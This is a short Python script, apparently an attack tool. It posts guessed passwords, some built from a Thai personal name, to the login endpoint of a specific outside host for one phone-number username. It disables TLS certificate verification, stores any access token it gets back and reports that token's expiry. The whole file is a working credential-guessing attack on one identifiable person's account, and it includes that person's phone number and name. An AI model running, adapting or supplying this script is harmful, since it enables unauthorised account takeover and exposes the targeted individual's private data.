#!/usr/bin/env python3 -I
"""probe_we88c_pbapi_auth.py — Auth we88c via pbapi with known password candidates."""
import json, base64, time, ssl, urllib.request, urllib.error, pathlib

TID  = "54ef7626cb381f4bab8be91f0cdbce47"
URL  = f"https://{TID}pbapi.asdgapicenterssdo.com/pb/authentication"
USER = "0972571110"
CTX  = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

CANDIDATES = [
    "Pwned2026!",
    "Aa112233",
    "Aa112233!",
    "ธนวัฒน์ พุฒอินทร์.Jwt",
    "ธนวัฒน์.Jwt",
    "0972571110.Jwt",
    "Thanawat.Jwt",
]

print(f"[*] {URL}")

for pw in CANDIDATES:
    body = json.dumps({"strategy": "local", "username": USER, "password": pw}).encode()
    req = urllib.request.Request(URL, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("template", "vn")
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=10) as r:
            d = json.loads(r.read(8192))
            code = r.status
    except urllib.error.HTTPError as e:
        try:
            d = json.loads(e.read(4096))
        except Exception:
            d = {"message": f"HTTP {e.code}"}
        code = e.code
    except Exception as ex:
        print(f"  ERR '{pw}': {ex}")
        continue

    tok = d.get("accessToken", "")
    if tok:
        pathlib.Path(".jwt.we88c").write_text(tok)
        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
        exp = json.loads(base64.b64decode(p)).get("exp", 0)
        print(f"[!!!] SUCCESS '{pw}' — exp in {int((exp - time.time()) / 60)}m")
        print(f"      Saved .jwt.we88c")
        break
    msg = d.get("message", "")
    en = msg.get("en", str(msg)[:80]) if isinstance(msg, dict) else str(msg)[:80]
    print(f"  [{code}] '{pw[:30]}': {en}")
